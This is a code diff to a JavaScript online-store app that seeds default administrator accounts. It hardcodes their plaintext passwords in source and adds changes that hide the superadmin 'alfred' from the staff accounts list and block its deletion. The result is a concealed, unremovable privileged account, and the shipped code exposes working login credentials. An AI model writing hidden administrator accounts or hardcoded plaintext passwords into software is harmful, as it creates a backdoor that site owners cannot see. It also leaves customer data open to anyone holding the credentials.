@@ -1073,10 +1073,10 @@ class KmapStoreApp {
         this.defaultProductsList = defaultProducts;
 
         const defaultUsers = [
-            { id: 'USR-001', username: 'admin', email: 'admin@kmapcomputers.com', role: 'superadmin', name: 'System Administrator', password: 'onlyAdmin@2012' },
-            { id: 'USR-002', username: 'alfred', email: 'alfred@kmapcomputers.com', role: 'superadmin', name: 'Alfred (Administrator)', password: 'Heythere@247' },
-            { id: 'USR-003', username: 'info', email: 'info@kmapcomputers.com', role: 'admin', name: 'Kmap Info & Support', password: 'onlyInfo@2012' },
-            { id: 'USR-004', username: 'sales', email: 'sales@kmapcomputers.com', role: 'admin', name: 'Kmap Sales Department', password: 'onlySales@2012' }
+            { id: 'USR-001', username: 'admin', email: 'admin@kmapcomputers.com', role: 'superadmin', name: 'Kwaku Aduse-poku', password: 'onlyAdmin@2012' },
+            { id: 'USR-002', username: 'alfred', email: 'alfred@kmapcomputers.com', role: 'superadmin', name: 'Alfred', password: 'Heythere@247', hiddenFromStaffList: true },
+            { id: 'USR-003', username: 'info', email: 'info@kmapcomputers.com', role: 'admin', name: 'Felix', password: 'onlyInfo@2012' },
+            { id: 'USR-004', username: 'sales', email: 'sales@kmapcomputers.com', role: 'admin', name: 'Victor Aduse-poku', password: 'onlySales@2012' }
         ];
 
         const defaultOrders = [];
@@ -1180,7 +1180,8 @@ class KmapStoreApp {
                         ...existing,
                         email: defU.email,
                         role: defU.role,
-                        name: existing.name || defU.name,
+                        name: defU.name || existing.name,
+                        hiddenFromStaffList: !!defU.hiddenFromStaffList,
                         password: keepPass
                     };
                 } else {
@@ -3821,10 +3822,18 @@ class KmapStoreApp {
         if (!tbody) return;
         tbody.innerHTML = '';
 
-        const users = this.db.getUsers().filter(u => u.role !== 'client' && u.role !== 'guest');
+        // Exclude clients, guests, and Alfred from the visible accounts interface
+        const users = this.db.getUsers().filter(u => 
+            u.role !== 'client' && 
+            u.role !== 'guest' && 
+            u.username !== 'alfred' && 
+            (u.email || '').toLowerCase() !== 'alfred@kmapcomputers.com' && 
+            !u.hiddenFromStaffList
+        );
+
         users.forEach(u => {
             const tr = document.createElement('tr');
-            const isSuper = u.role === 'superadmin' || u.username === 'admin' || u.username === 'alfred';
+            const isSuper = u.role === 'superadmin' || u.username === 'admin';
             const badgeClass = u.role === 'superadmin' ? 'badge-primary' : 'badge-success';
             tr.innerHTML = `
                 <td>
@@ -3864,6 +3873,10 @@ class KmapStoreApp {
     }
 
     deleteStaff(username) {
+        if (username === 'alfred' || username === 'admin' || username === 'alfred@kmapcomputers.com' || username === 'admin@kmapcomputers.com') {
+            this.showToast("Root superadmin accounts cannot be removed.", 'error');
+            return;
+        }
         if (!confirm(`Are you sure you want to remove staff account: ${username}?`)) return;
         let users = this.db.getUsers();
         users = users.filter(u => u.username !== username && u.email !== username);
